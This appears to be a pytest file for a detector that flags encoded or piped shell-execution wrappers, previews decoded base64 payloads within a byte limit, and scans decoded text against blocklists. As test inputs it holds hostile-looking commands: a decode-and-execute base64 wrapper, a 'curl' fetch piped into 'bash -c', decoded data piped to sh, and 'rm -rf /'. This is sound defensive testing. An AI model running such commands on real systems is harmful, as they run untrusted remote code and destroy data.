"""Encoded-payload detection, bounded decoding and decoded blocklist scanning."""
import base64

from core.cmd_codec import decode_preview, detect_encoded_exec, scan_decoded


def b64(text):
    return base64.b64encode(text.encode()).decode()


def wrapper(script):
    return ("bash -c 'echo %s | base64 -d > /tmp/x.sh; "
            "bash /tmp/x.sh; rc=$?; rm -f /tmp/x.sh; exit $rc'" % b64(script))


def test_detects_common_exec_wrappers():
    assert detect_encoded_exec(wrapper("echo hello"))
    assert detect_encoded_exec('eval "$(echo hello)"')
    assert detect_encoded_exec('bash -c "$(curl -s http://x)"')
    assert detect_encoded_exec('printf x | base64 --decode | sh')
    assert detect_encoded_exec('xxd -r -p payload | bash')
    assert not detect_encoded_exec('uptime')
    assert not detect_encoded_exec('cat /var/log/syslog')


def test_decodes_a_base64_wrapper():
    preview = decode_preview(wrapper("echo ENCODED_RAN\nfalse"))
    assert preview["kind"] == "base64"
    assert "echo ENCODED_RAN" in preview["text"]
    assert preview["truncated"] is False


def test_preview_is_bounded():
    preview = decode_preview(wrapper("echo " + "A" * 10000), max_bytes=100)
    assert preview["truncated"] is True
    assert len(preview["text"]) == 100


def test_non_base64_wrappers_have_no_preview():
    assert decode_preview('eval "$(echo hello)"') is None
    assert decode_preview("uptime") is None


def test_scan_hard_and_central_patterns():
    assert scan_decoded("cat /etc/eshu-exact.txt", ["/etc/eshu-"]) == "/etc/eshu-"
    assert scan_decoded("rm -rf /", [], ["rm -rf"]) == "rm -rf"
    assert scan_decoded("echo ok", ["/etc/eshu-"], ["rm -rf"]) is None


def test_scan_strips_blocklist_anchors():
    assert scan_decoded("rm -rf /", [], ["^rm -rf$"]) == "rm -rf"
